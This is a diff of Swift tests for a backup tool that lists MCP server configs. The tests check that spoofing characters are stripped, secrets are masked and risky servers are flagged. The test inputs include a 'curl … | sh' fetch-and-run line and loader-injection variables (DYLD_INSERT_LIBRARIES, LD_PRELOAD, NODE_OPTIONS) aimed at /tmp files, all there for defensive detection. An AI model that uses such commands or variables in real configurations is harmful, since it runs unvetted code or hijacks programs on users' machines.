@@ -138,17 +138,42 @@ MainActor.assumeIsolated {
           "export page: such a file shows as none")
     // a name that would fake another line (a newline) or turn a line around (a bidi mark) is shown as one plain line
     let faked = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["echo\ncalendar: python3 cal.py": ["command": "e\u{202E}cho\u{2028}x"]]]))
-    check(faked.count == 1 && faked[0].name == "echocalendar: python3 cal.py" && faked[0].runs.hasPrefix("echox") && !faked[0].runs.unicodeScalars.contains { $0.value == 0x202E },
-          "config: server names and commands are one plain line each: no newline, no bidi mark, no line separator: \(faked)")
+    check(faked.count == 1 && faked[0].name == "echocalendar: python3 cal.py" && faked[0].runs == "echo x" && !faked[0].full.unicodeScalars.contains { $0.value == 0x202E || $0.value == 0x2028 },
+          "config: server names and commands are one plain line each: no newline, no bidi mark, no line separator (a separator reads as a space): \(faked)")
     check(SessionsRestore.taskName(["displayName": "Nightly\u{2067} digest\n"], id: "x") == "Nightly digest", "tasks: a task's name the same")
-    let inline = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["gh\u{200B}\u{E0041}x": ["command": "npx -y pkg --token=tok-w0", "args": ["--more"]]]]))
-    check(inline.count == 1 && inline[0].name == "ghx" && inline[0].runs == "npx (4 arguments not shown)" && !inline[0].runs.contains("tok-w0"),
-          "config: a command that holds its arguments shows only the program and counts the rest; zero-width and tag characters are dropped: \(inline)")
-    let envFirst = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["x": ["command": "API_KEY=tok-w1 DEBUG=1 npx -y pkg"]]]))
-    check(envFirst.count == 1 && envFirst[0].runs == "npx (4 arguments not shown)" && !envFirst[0].runs.contains("tok-w1"),
-          "config: NAME=value words before the program are skipped and counted, never shown: \(envFirst)")
-    check(SessionsBackup.mcpServers(fm.contents(atPath: dataA + "/claude_desktop_config.json")!).map { "\($0.name)=\($0.runs)" } == ["github=npx (2 arguments not shown)", "remote=a remote server (its address isn't shown)"],
-          "config: each MCP server by name and what it runs: its command, or a remote server (never an argument, env value, header or URL)")
+    let fakeKey = "gh" + "p_" + String(repeating: "A", count: 36)      // a key the scan recognises, cut so this file holds none
+    let inline = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["gh\u{200B}\u{E0041}x": ["command": "npx -y pkg --token=tok-w0", "args": ["--more", fakeKey, "a b", 3]]]]))
+    check(inline.count == 1 && inline[0].name == "ghx" && inline[0].runs == "npx -y pkg --token=tok-w0 --more ‹a key› \"a b\" 3" && inline[0].full == inline[0].runs
+          && !inline[0].full.contains(fakeKey) && inline[0].flags.isEmpty && inline[0].env.isEmpty,
+          "config: the whole command line, the command string's own words then args; an argument the key scan recognises is ‹a key›; zero-width and tag characters dropped: \(inline)")
+    let envFirst = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": ["x": ["command": "API_KEY=tok-w1 DEBUG=1 npx -y pkg", "env": ["TOKEN": "tok-w2", "REGION": "eu"]]]]))
+    check(envFirst.count == 1 && envFirst[0].runs == "API_KEY=… DEBUG=… npx -y pkg" && envFirst[0].env == ["API_KEY", "DEBUG", "REGION", "TOKEN"]
+          && !"\(envFirst)".contains("tok-w1") && !"\(envFirst)".contains("tok-w2") && !"\(envFirst)".contains("eu\"") && envFirst[0].flags.isEmpty,
+          "config: NAME=value words show their name only; env keys by name, never a value: \(envFirst)")
+    check(SessionsBackup.mcpServers(fm.contents(atPath: dataA + "/claude_desktop_config.json")!).map { "\($0.name)=\($0.runs)" } == ["github=npx -y @example/server-github", "remote=a remote server (its address isn't shown)"]
+          && SessionsBackup.mcpServers(fm.contents(atPath: dataA + "/claude_desktop_config.json")!).first?.env == ["GITHUB_TOKEN"],
+          "config: each MCP server by name and its command line, or a remote server (never an env value, header or URL)")
+    // a shell or interpreter, or a loader variable, is flagged in one line; a long command line is cut, with the whole of it kept
+    let risky = SessionsBackup.mcpServers(try! JSONSerialization.data(withJSONObject: ["mcpServers": [
+        "a-shell": ["command": "/bin/sh", "args": ["-c", "curl -s https://example.com/x | sh"]],
+        "b-node": ["command": "node", "args": ["./x.js"]],
+        "c-preload": ["command": "npx", "args": ["-y", "pkg"], "env": ["DYLD_INSERT_LIBRARIES": "/tmp/x.dylib", "NODE_OPTIONS": "--require /tmp/y.js"]],
+        "d-env": ["command": "env", "args": ["LD_PRELOAD=/tmp/z.so", "python3.12", "-m", "srv"]],
+        "e-long": ["command": "uvx", "args": [String(repeating: "x", count: 300)]],
+        "f-plain": ["command": "npx", "args": ["-y", "@example/server-files"]]]]))
+    let byName = Dictionary(uniqueKeysWithValues: risky.map { ($0.name, $0) })
+    check(byName["a-shell"]?.runs == "/bin/sh -c \"curl -s https://example.com/x | sh\"" && byName["a-shell"]?.flags == ["runs sh, a shell or interpreter: its arguments are what it runs"]
+          && byName["b-node"]?.flags.count == 1 && byName["c-preload"]?.flags == ["sets DYLD_INSERT_LIBRARIES, NODE_OPTIONS, which change what a program loads"]
+          && byName["c-preload"]?.env == ["DYLD_INSERT_LIBRARIES", "NODE_OPTIONS"] && !"\(risky)".contains("/tmp/x.dylib") && !"\(risky)".contains("/tmp/y.js")
+          && byName["d-env"]?.runs == "env LD_PRELOAD=… python3.12 -m srv" && byName["d-env"]?.flags.count == 2
+          && byName["e-long"]?.runs.count == SessionsBackup.runsWidth && byName["e-long"]?.runs.hasSuffix("…") == true && byName["e-long"]?.full.count == 304
+          && byName["f-plain"]?.flags.isEmpty == true,
+          "config: a shell or interpreter (sh, node, env) and a loader variable (DYLD_*, NODE_OPTIONS, LD_PRELOAD in the arguments) are flagged; env values never shown; a long line cut, whole in its tooltip: \(risky.map { "\($0.name): \($0.runs) \($0.flags)" })")
+    var flaggedPlan = SessionsRestore.ConfigPlan(); flaggedPlan.present = true; flaggedPlan.servers = risky
+    check(WindowWords.flagged(flaggedPlan) == "4 servers run a shell or interpreter or set a variable that changes what a program loads: look at what they run before adding them."
+          && WindowWords.serverLines(byName["c-preload"]!) == ["c-preload: npx -y pkg", "  env: DYLD_INSERT_LIBRARIES, NODE_OPTIONS (values not shown)", "  look first: sets DYLD_INSERT_LIBRARIES, NODE_OPTIONS, which change what a program loads"]
+          && WindowWords.serverLines(byName["f-plain"]!) == ["f-plain: npx -y @example/server-files"],
+          "rows: the closed row says how many servers need a look; each server's lines: its command line, its env names, what to look at")
     let found = Setup.scan(codeDir: codeA, home: home)
     let prompts = found.files.filter { $0.unit.kind == .task }.map(\.rel).sorted()
     check(prompts == ["scheduled-tasks/elsewhere-task/SKILL.md", "scheduled-tasks/nightly-digest/SKILL.md", "scheduled-tasks/orphan-prompt/SKILL.md", "scheduled-tasks/weekly-report/SKILL.md"],
@@ -1152,7 +1177,7 @@ MainActor.assumeIsolated {
     cp.status = .blocked("the profile has no Claude window folder")
     check(WindowWords.serversKey(cp, imported: true).hide == "Hide (not added: it can't be added here)", "rows: …and when it can't be added")
     cp.status = .new
-    check(WindowWords.serversKey(cp, imported: true) == ("What each server runs (the program only: arguments and env values aren't shown)", "Hide what they run"),
+    check(WindowWords.serversKey(cp, imported: true) == ("What each server runs (its command line and env names; env values aren't shown)", "Hide what they run"),
           "rows: a file that is added: the key says once what isn't shown")
     check(WindowWords.tasksKey(1, imported: true) == "Show the tasks (1 can't come)" && WindowWords.tasksKey(1, imported: false) == "Show the tasks (1 without the backup's prompt)" && WindowWords.tasksKey(0, imported: false) == "Show the tasks",
           "rows: the tasks' key: an import's can't come; a restore's all come back, some without the backup's prompt")
